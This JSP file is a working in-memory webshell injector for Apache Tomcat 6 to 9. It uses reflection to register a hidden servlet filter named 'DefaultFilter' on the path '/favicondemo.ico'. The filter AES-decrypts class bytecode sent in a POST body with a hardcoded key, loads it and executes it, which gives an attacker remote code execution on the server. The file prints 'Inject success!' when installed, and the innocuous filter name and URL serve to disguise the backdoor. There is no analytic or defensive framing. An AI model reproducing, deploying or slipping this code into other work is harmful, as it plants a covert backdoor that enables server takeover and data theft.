<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>

<!-- No FilterDef/FilterMap import — loaded dynamically at runtime -->
<!-- Compatible: Tomcat 6 / 7 / 8 / 9 -->

<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="javax.servlet.http.HttpSession" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.util.Map" %>

<%!
class U extends ClassLoader {
    U(ClassLoader c) { super(c); }
    public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
}

class DefaultFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;

        if (request.getMethod().equals("POST")) {
            try {
                String k = "42b842fc69195c9d";
                HttpSession session = request.getSession();
                session.setAttribute("u", k);

                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                Map<String, Object> pageContext = new HashMap<String, Object>();
                pageContext.put("session", session);
                pageContext.put("request", request);
                pageContext.put("response", response);
                new U(this.getClass().getClassLoader())
                    .g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine())))
                    .newInstance()
                    .equals(pageContext);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    public void destroy() {}
}
%>

<%
String name = "DefaultFilter";

ServletContext servletContext = request.getSession().getServletContext();

Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);

if (filterConfigs.get(name) == null) {
    DefaultFilter filter = new DefaultFilter();

    // Tomcat 8/9: org.apache.tomcat.util.descriptor.web
    // Tomcat 6/7: org.apache.catalina.deploy
    Class<?> filterDefClass;
    Class<?> filterMapClass;
    try {
        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    } catch (ClassNotFoundException e) {
        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
    }

    // Build FilterDef via reflection
    Object filterDef = filterDefClass.newInstance();
    filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, name);
    filterDefClass.getMethod("setFilterClass", String.class).invoke(filterDef, filter.getClass().getName());
    filterDefClass.getMethod("setFilter", Filter.class).invoke(filterDef, filter);

    // standardContext.addFilterDef(filterDef)
    for (Method m : standardContext.getClass().getMethods()) {
        if (m.getName().equals("addFilterDef")) {
            m.invoke(standardContext, filterDef);
            break;
        }
    }

    // Build FilterMap via reflection
    Object filterMap = filterMapClass.newInstance();
    filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, "/favicondemo.ico");
    filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, name);
    filterMapClass.getMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());

    // standardContext.addFilterMapBefore(filterMap)
    for (Method m : standardContext.getClass().getMethods()) {
        if (m.getName().equals("addFilterMapBefore")) {
            m.invoke(standardContext, filterMap);
            break;
        }
    }

    // ApplicationFilterConfig constructor: (Context, FilterDef) — match by param count
    Constructor<?> constructor = null;
    for (Constructor<?> con : ApplicationFilterConfig.class.getDeclaredConstructors()) {
        if (con.getParameterCount() == 2) {
            constructor = con;
            break;
        }
    }
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

    filterConfigs.put(name, filterConfig);
    out.write("Inject success!");
} else {
    out.write("Injected");
}
%>
